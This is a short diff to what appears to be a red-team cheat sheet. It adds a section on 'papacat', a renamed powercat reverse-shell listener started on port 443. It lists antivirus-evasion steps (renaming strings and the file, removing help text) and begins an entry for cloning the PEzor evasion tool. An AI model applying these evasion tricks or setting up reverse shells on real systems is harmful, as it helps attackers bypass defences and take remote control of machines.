@@ -165,6 +165,22 @@ Microsoft Windows [Version 10.0.18363.900]
 
 C:\Windows\System32>
 ```
+# Papacatv2
+Taken from: https://www.ired.team/offensive-security/defense-evasion/bypassing-ids-signatures-with-simple-reverse-shells
+```powershell
+PS C:\users\User\Desktop> papacat -l -p 443 -v
+VERBOSE: Set Stream 1: TCP
+VERBOSE: Set Stream 2: Console
+VERBOSE: Setting up Stream 1...
+VERBOSE: Listening on [0.0.0.0] (port 443)
+```
+Extra features I performed to ensure (basic) AV evasion is done right:
+- renamed every mention of 'powercat' to 'papacat' in the file
+- renamed the file from 'powercat.ps1' to 'papacat.ps1'
+- removed the help output from '$Help'
+
+These steps may not be necessary to evade AV. 
+
 # PEzor!
 ```
 git clone https://github.com/phra/PEzor.git
